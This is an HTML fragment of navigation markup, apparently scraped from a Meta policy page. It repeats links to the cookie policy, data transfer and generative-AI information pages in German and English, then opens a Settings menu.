                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für die Datenübertragung</font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sonstige Bedingungen</font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für die Datenübertragung</font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sonstige Bedingungen</font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Cookie Policy</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Information for those who do not use Meta Products</div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How Meta uses information for generative AI models</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Data Transfer Framework Policy</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Other terms and conditions</div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Cookie Policy</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Information for those who do not use Meta Products</div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How Meta uses information for generative AI models</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Data Transfer Framework Policy</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Other terms and conditions</div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Cookie Policy</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Information for those who do not use Meta Products</div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How Meta uses information for generative AI models</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Data Transfer Framework Policy</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Other terms and conditions</div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div></div>
                        <div class="action-button collapsed" data-bs-toggle="collapse" data-bs-target="#SettingCollapse" aria-expanded="false" aria-controls="SettingCollapse">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M16 12a4 4 0 1 1-8 0 4 4 0 0 1 8 0zm-2 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0z">
                                    </path>
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="m22.191 9.207-2.224 2.06a8.112 8.112 0 0 1 0 1.466l2.224 2.06a1 1 0 0 1 .187 1.233l-1.702 2.948a1 1 0 0 1-1.162.455l-2.895-.896a7.991 7.991 0 0 1-1.27.735l-.672 2.954a1 1 0 0 1-.975.778H10.3a1 1 0 0 1-.975-.778l-.672-2.954a8 8 0 0 1-1.27-.735l-2.895.896a1 1 0 0 1-1.162-.455l-1.702-2.948a1 1 0 0 1 .187-1.233l2.224-2.06a8.1 8.1 0 0 1 0-1.466L1.81 9.207a1 1 0 0 1-.187-1.233l1.702-2.948a1 1 0 0 1 1.162-.455l2.895.896a7.992 7.992 0 0 1 1.27-.735l.672-2.954A1 1 0 0 1 10.299 1h3.403a1 1 0 0 1 .975.778l.672 2.954a7.99 7.99 0 0 1 1.27.735l2.895-.896a1 1 0 0 1 1.162.455l1.702 2.948a1 1 0 0 1-.187 1.233zm-8.574-3.071.894.412c.335.155.653.34.952.551l.805.57 3.075-.951.903 1.564-2.36 2.186.09.98a6.093 6.093 0 0 1 0 1.104l-.09.98 2.36 2.185-.903 1.565-3.075-.951-.805.57a5.993 5.993 0 0 1-.952.55l-.894.413L12.904 21h-1.807l-.713-3.136-.894-.412a5.993 5.993 0 0 1-.952-.551l-.805-.57-3.075.951-.904-1.565 2.36-2.185-.089-.98a6.102 6.102 0 0 1 0-1.104l.09-.98-2.36-2.186.903-1.564 3.075.951.805-.57c.299-.212.617-.396.952-.55l.894-.413L11.097 3h1.807l.713 3.136z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                Einstellungen
                            </font></font></font></font></font></font></div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class="ARROW">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                        <div class="collapse" id="SettingCollapse" style="">
                        <div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
